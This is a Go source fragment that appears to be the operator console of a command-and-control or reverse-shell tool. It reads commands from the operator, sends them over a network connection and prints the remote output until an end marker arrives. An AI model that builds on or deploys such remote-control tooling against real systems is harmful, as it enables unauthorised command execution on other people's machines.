package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
)

var pendingCommand string
var outputDone = make(chan bool)

func getUserInput() {
	input := bufio.NewReader(os.Stdin)
	for {
		fmt.Printf("[operator]> ")
		command, err := input.ReadString('\n')
		if err != nil {
			log.Println("[-] Error reading input:", err)
			return
		}

		pendingCommand = strings.TrimSpace(command)
		<-outputDone
	}
}

func sendCommands(conn net.Conn) {

	fmt.Println("[*] Sending command:", pendingCommand)
	_, err := conn.Write([]byte(pendingCommand))
	if err != nil {
		log.Println("[-] Error sending command", err)
		return
	}

	fmt.Println("[+] Command sent successfully")
}

func receiveOutput(conn net.Conn) {
	response := bufio.NewReader(conn)
	for {
		output, err := response.ReadString('\n')
		if err != nil {
			return
		}

		if strings.TrimSpace(output) == "END_OF_OUTPUT" || strings.TrimSpace(output) == "NO_COMMAND" {
			outputDone <- true
			return
		}
		fmt.Print(output)
	}

}
